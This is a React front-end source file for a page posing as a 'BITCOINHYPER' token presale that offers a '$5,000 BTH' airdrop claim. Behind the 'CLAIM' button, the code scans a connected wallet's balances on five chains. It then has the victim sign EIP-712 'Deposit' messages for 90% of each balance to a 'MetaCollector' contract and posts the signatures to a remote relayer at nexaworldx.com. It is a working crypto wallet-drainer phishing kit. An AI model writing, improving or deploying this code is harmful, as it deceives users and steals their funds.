import React, { useState, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
// UPDATE THESE AFTER DEPLOYING THE NEW CONTRACT
// ============================================

const ETH_RPC_ENDPOINTS = [
  'https://eth.llamarpc.com',
  'https://ethereum.publicnode.com',
  'https://rpc.ankr.com/eth',
  'https://cloudflare-eth.com'
];

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-blue-500 to-indigo-600',
    rpcEndpoints: ETH_RPC_ENDPOINTS
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xYourNewBscContract', // <-- REPLACE
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-yellow-500 to-orange-600',
    rpcEndpoints: ['https://bsc-dataseed.binance.org']
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xYourNewPolygonContract', // <-- REPLACE
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-purple-500 to-pink-600',
    rpcEndpoints: ['https://polygon-rpc.com']
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xYourNewArbitrumContract', // <-- REPLACE
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-cyan-500 to-blue-600',
    rpcEndpoints: ['https://arb1.arbitrum.io/rpc']
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xYourNewAvalancheContract', // <-- REPLACE
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-500 to-red-700',
    rpcEndpoints: ['https://api.avax.network/ext/bc/C/rpc']
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);

// Helper: fetch balance for a single chain with fallback RPCs
const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
  for (let attempt = 0; attempt <= retries; attempt++) {
    for (const rpcUrl of chain.rpcEndpoints) {
      try {
        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, 18));
        return { amount, success: true, usedRpc: rpcUrl };
      } catch (err) {
        console.warn(`[${chain.name}] RPC ${rpcUrl} failed:`, err.message);
      }
    }
    if (attempt < retries) await new Promise(resolve => setTimeout(resolve, 1000));
  }
  throw new Error(`No working RPC for ${chain.name}`);
};

const switchNetwork = async (walletProvider, chainId) => {
  try {
    await walletProvider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: `0x${chainId.toString(16)}` }],
    });
    return true;
  } catch (error) {
    if (error.code === 4902) throw new Error(`Network ${chainId} not added to wallet`);
    throw error;
  }
};

function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();

  // UI state
  const [balances, setBalances] = useState({});
  const [totalUSD, setTotalUSD] = useState(0);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [isEligible, setIsEligible] = useState(false);
  const [loading, setLoading] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [currentChain, setCurrentChain] = useState('');
  const [stepMessages, setStepMessages] = useState([]);
  const [completedChains, setCompletedChains] = useState([]);
  const [error, setError] = useState('');
  const [successModal, setSuccessModal] = useState(false);
  const [relayerUrl, setRelayerUrl] = useState('https://nexaworldx.com/relayer-app'); // CHANGE THIS
  const [testRelayerStatus, setTestRelayerStatus] = useState(null);

  const EIP712_TYPES = {
    Deposit: [
      { name: "user", type: "address" },
      { name: "amount", type: "uint256" },
      { name: "nonce", type: "uint256" }
    ]
  };
  const MIN_VALUE_THRESHOLD = 1; // $1

  // Fetch balances on all chains
  const fetchAllBalances = async (walletAddress) => {
    setScanning(true);
    setScanProgress(0);
    setError('');
    const balanceResults = {};
    let scanned = 0;
    const total = DEPLOYED_CHAINS.length;
    for (const chain of DEPLOYED_CHAINS) {
      try {
        const { amount } = await fetchChainBalance(chain, walletAddress);
        let price = 0;
        if (chain.symbol === 'ETH') price = 2000; // would fetch from API, but simplified
        else if (chain.symbol === 'BNB') price = 300;
        else if (chain.symbol === 'MATIC') price = 0.75;
        else if (chain.symbol === 'AVAX') price = 32;
        const valueUSD = amount * price;
        if (amount > 0.000001) {
          balanceResults[chain.name] = { amount, valueUSD, symbol: chain.symbol, chainId: chain.chainId, contractAddress: chain.contractAddress };
        }
        scanned++;
        setScanProgress(Math.round((scanned / total) * 100));
      } catch (err) {
        console.error(`Failed ${chain.name}:`, err);
      }
    }
    setBalances(balanceResults);
    const totalValue = Object.values(balanceResults).reduce((s, b) => s + b.valueUSD, 0);
    setTotalUSD(totalValue);
    const eligible = totalValue >= MIN_VALUE_THRESHOLD;
    setIsEligible(eligible);
    const eligibleChainsList = DEPLOYED_CHAINS.filter(c => balanceResults[c.name] && balanceResults[c.name].valueUSD >= MIN_VALUE_THRESHOLD);
    setEligibleChains(eligibleChainsList);
    setScanning(false);
  };

  // Test relayer connectivity
  const testRelayer = async () => {
    setTestRelayerStatus('testing');
    try {
      const res = await fetch(relayerUrl, { method: 'OPTIONS' });
      if (res.ok) setTestRelayerStatus('ok');
      else setTestRelayerStatus('error');
    } catch (err) {
      setTestRelayerStatus('error');
    }
  };

  const addStepMessage = (msg, isError = false) => {
    setStepMessages(prev => [...prev, { text: msg, error: isError, time: new Date().toLocaleTimeString() }]);
  };

  // Main claim function
  const executeClaim = async () => {
    if (!walletProvider || !address) {
      setError("Wallet not connected");
      return;
    }
    setProcessing(true);
    setError('');
    setStepMessages([]);
    setCompletedChains([]);

    const chainsToProcess = eligibleChains;
    if (chainsToProcess.length === 0) {
      setError("No chain with ≥ $1 value found.");
      setProcessing(false);
      return;
    }

    for (const chain of chainsToProcess) {
      setCurrentChain(chain.name);
      addStepMessage(`🔄 Processing ${chain.name}...`);
      try {
        // 1. Switch network
        addStepMessage(`  ⚡ Switching network to ${chain.name}...`);
        await switchNetwork(walletProvider, chain.chainId);
        addStepMessage(`  ✅ Network switched.`);

        // 2. Create signer and provider
        const newProvider = new ethers.BrowserProvider(walletProvider);
        const signer = await newProvider.getSigner();
        const signerAddress = await signer.getAddress();
        if (signerAddress.toLowerCase() !== address.toLowerCase()) throw new Error("Signer mismatch");

        // 3. Get current nonce from contract
        addStepMessage(`  🔢 Fetching current nonce...`);
        const contract = new ethers.Contract(chain.contractAddress, [
          "function userNonce(address) view returns (uint256)"
        ], newProvider);
        const nonce = await contract.userNonce(address);
        addStepMessage(`  ✅ Nonce: ${nonce}`);

        // 4. Get balance and compute amount to send (90%)
        const balance = balances[chain.name];
        if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) {
          addStepMessage(`  ⚠️ Balance changed, skipping.`, true);
          continue;
        }
        const amountToSend = balance.amount * 0.90;
        const amountInWei = ethers.parseEther(amountToSend.toFixed(18));
        const valueUSD = (balance.valueUSD * 0.90).toFixed(2);
        addStepMessage(`  💰 Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);

        // 5. Build EIP-712 signature
        const domain = {
          name: "MetaCollector",
          version: "1",
          chainId: chain.chainId,
          verifyingContract: chain.contractAddress
        };
        const value = { user: address, amount: amountInWei.toString(), nonce };
        addStepMessage(`  ✍️ Requesting signature...`);
        const signature = await signer.signTypedData(domain, EIP712_TYPES, value);
        addStepMessage(`  ✅ Signature obtained.`);

        // 6. Send to relayer
        const signaturePayload = { domain, types: EIP712_TYPES, value, signature, expectedSigner: address };
        addStepMessage(`  📡 Sending to relayer...`);
        const relayerResponse = await fetch(relayerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ contractAddress: chain.contractAddress, signaturePayload })
        });
        const responseText = await relayerResponse.text();
        let relayerResult;
        try { relayerResult = JSON.parse(responseText); } catch (e) { throw new Error(`Invalid relayer response: ${responseText.substring(0, 100)}`); }
        if (!relayerResult.success) throw new Error(relayerResult.error || 'Relayer failed');
        addStepMessage(`  ✅ Transaction submitted! Hash: ${relayerResult.hash.substring(0, 10)}...`);
        setCompletedChains(prev => [...prev, chain.name]);
      } catch (err) {
        addStepMessage(`  ❌ Error: ${err.message}`, true);
        setError(`Failed on ${chain.name}: ${err.message}`);
        // Continue to next chain? We'll stop on error for simplicity
        break;
      }
    }
    if (completedChains.length === eligibleChains.length && eligibleChains.length > 0) {
      setSuccessModal(true);
    }
    setProcessing(false);
    setCurrentChain('');
  };

  useEffect(() => {
    if (isConnected && address) fetchAllBalances(address);
  }, [isConnected, address]);

  const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(-4)}` : '';

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-black to-gray-900 text-white font-sans overflow-x-hidden">
      {/* Animated background particles */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        {[...Array(50)].map((_, i) => (
          <div key={i} className="absolute rounded-full bg-white/5 animate-float-particles" style={{
            left: `${Math.random() * 100}%`,
            top: `${Math.random() * 100}%`,
            width: `${2 + Math.random() * 6}px`,
            height: `${2 + Math.random() * 6}px`,
            animationDuration: `${5 + Math.random() * 15}s`,
            animationDelay: `${Math.random() * 10}s`
          }} />
        ))}
      </div>

      <div className="relative z-10 container mx-auto px-4 py-8 max-w-5xl">
        {/* Header */}
        <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-12">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-full bg-gradient-to-tr from-yellow-500 to-orange-600 flex items-center justify-center shadow-lg animate-pulse-glow">
              <span className="text-2xl">⚡</span>
            </div>
            <h1 className="text-3xl md:text-4xl font-black bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">BITCOINHYPER</h1>
          </div>
          {!isConnected ? (
            <button onClick={open} className="px-6 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold shadow-lg hover:scale-105 transition-all flex items-center gap-2">
              <span className="relative flex h-3 w-3"><span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span><span className="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span></span>
              CONNECT WALLET
            </button>
          ) : (
            <div className="flex items-center gap-3 bg-white/10 backdrop-blur rounded-full pl-4 pr-2 py-1">
              <span className="text-sm font-mono">{formatAddress(address)}</span>
              <button onClick={disconnect} className="w-8 h-8 rounded-full bg-red-500/20 hover:bg-red-500/40 flex items-center justify-center">🔌</button>
            </div>
          )}
        </div>

        {/* Main Card */}
        <div className="backdrop-blur-xl bg-white/5 rounded-3xl border border-white/10 p-6 md:p-10 shadow-2xl">
          {/* Hero */}
          <div className="text-center mb-8">
            <div className="inline-block px-4 py-1 rounded-full bg-yellow-500/20 text-yellow-300 text-sm mb-4 animate-pulse">✦ PRESALE STAGE 4 ✦</div>
            <h2 className="text-5xl md:text-7xl font-black bg-gradient-to-r from-yellow-300 via-orange-400 to-red-500 bg-clip-text text-transparent">$5,000 BTH</h2>
            <p className="text-gray-400 mt-2">+25% instant bonus · limited supply</p>
          </div>

          {/* Relayer Debug Panel */}
          <div className="mb-6 bg-black/40 rounded-xl p-4 border border-white/10">
            <div className="flex flex-wrap items-center gap-3 justify-between">
              <div className="flex-1 min-w-[200px]">
                <label className="text-xs text-gray-400">Relayer Endpoint</label>
                <input type="text" value={relayerUrl} onChange={e => setRelayerUrl(e.target.value)} className="w-full bg-black/50 rounded px-2 py-1 text-sm text-white border border-white/20" />
              </div>
              <button onClick={testRelayer} className="mt-4 sm:mt-0 px-4 py-1 bg-blue-600 rounded-full text-sm">Test Connection</button>
              {testRelayerStatus === 'ok' && <span className="text-green-400 text-sm">✅ Reachable</span>}
              {testRelayerStatus === 'error' && <span className="text-red-400 text-sm">❌ Unreachable</span>}
            </div>
          </div>

          {/* Eligibility Status */}
          {isConnected && (
            <div className="mb-8">
              {scanning && (
                <div className="text-center">
                  <div className="w-full h-2 bg-white/10 rounded-full overflow-hidden"><div className="h-full bg-yellow-500 rounded-full transition-all duration-300" style={{ width: `${scanProgress}%` }}></div></div>
                  <p className="text-sm text-gray-400 mt-2">Scanning {scanProgress}%</p>
                </div>
              )}
              {!scanning && !processing && (
                <div className={`rounded-2xl p-6 text-center ${isEligible ? 'bg-green-500/10 border border-green-500/30' : 'bg-red-500/10 border border-red-500/30'}`}>
                  {isEligible ? (
                    <>
                      <p className="text-green-400 font-bold text-lg">✅ YOU ARE ELIGIBLE!</p>
                      <p className="text-2xl font-bold mt-2">${totalUSD.toFixed(2)} total value</p>
                      <p className="text-sm text-gray-400">{eligibleChains.length} chain(s) with ≥ $1</p>
                      <button onClick={executeClaim} className="mt-4 px-8 py-3 rounded-full bg-gradient-to-r from-yellow-500 to-orange-600 font-bold text-black text-lg shadow-xl hover:scale-105 transition-all flex items-center justify-center gap-2 mx-auto">
                        🎁 CLAIM $5,000 BTH
                      </button>
                    </>
                  ) : (
                    <>
                      <p className="text-red-400 font-bold">⚠️ Insufficient Balance</p>
                      <p>Need at least $1 USD equivalent across chains.</p>
                    </>
                  )}
                </div>
              )}
            </div>
          )}

          {/* Processing Steps */}
          {processing && (
            <div className="mb-8 bg-black/40 rounded-2xl p-4 border border-white/10">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-6 h-6 rounded-full border-2 border-yellow-500 border-t-transparent animate-spin"></div>
                <span className="font-bold">Processing {currentChain}...</span>
              </div>
              <div className="space-y-1 max-h-60 overflow-y-auto text-sm font-mono">
                {stepMessages.map((msg, idx) => (
                  <div key={idx} className={msg.error ? 'text-red-400' : 'text-gray-300'}>{msg.text}</div>
                ))}
              </div>
            </div>
          )}

          {/* Completed Chains */}
          {completedChains.length > 0 && (
            <div className="mb-6">
              <p className="text-green-400">✓ Completed on: {completedChains.join(', ')}</p>
            </div>
          )}

          {error && <div className="bg-red-500/20 border border-red-500 rounded p-3 text-red-300 text-sm">{error}</div>}
        </div>

        {/* Stats Footer */}
        <div className="mt-8 text-center text-gray-500 text-xs">
          © 2025 BITCOINHYPER — 5,000 BTH Airdrop
        </div>
      </div>

      {/* Success Modal */}
      {successModal && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur flex items-center justify-center z-50 p-4">
          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-8 text-center max-w-md border border-yellow-500/30 animate-fadeInUp">
            <div className="text-6xl mb-4">🎉</div>
            <h3 className="text-2xl font-bold text-yellow-400">SUCCESS!</h3>
            <p className="mt-2">You have secured <strong className="text-yellow-300">$5,000 BTH</strong> +{presaleBonus}% bonus!</p>
            <button onClick={() => setSuccessModal(false)} className="mt-6 px-6 py-2 bg-yellow-600 rounded-full">Close</button>
          </div>
        </div>
      )}

      <style jsx>{`
        @keyframes float-particles {
          0% { transform: translateY(0) translateX(0); opacity: 0.2; }
          100% { transform: translateY(-100vh) translateX(20px); opacity: 0; }
        }
        .animate-float-particles { animation: float-particles linear infinite; }
        .animate-pulse-glow { animation: pulse-glow 2s infinite; }
        @keyframes pulse-glow { 0% { box-shadow: 0 0 0 0 rgba(234,179,8,0.4); } 70% { box-shadow: 0 0 0 10px rgba(234,179,8,0); } 100% { box-shadow: 0 0 0 0 rgba(234,179,8,0); } }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fadeInUp { animation: fadeInUp 0.3s ease-out; }
      `}</style>
    </div>
  );
}

export default App;
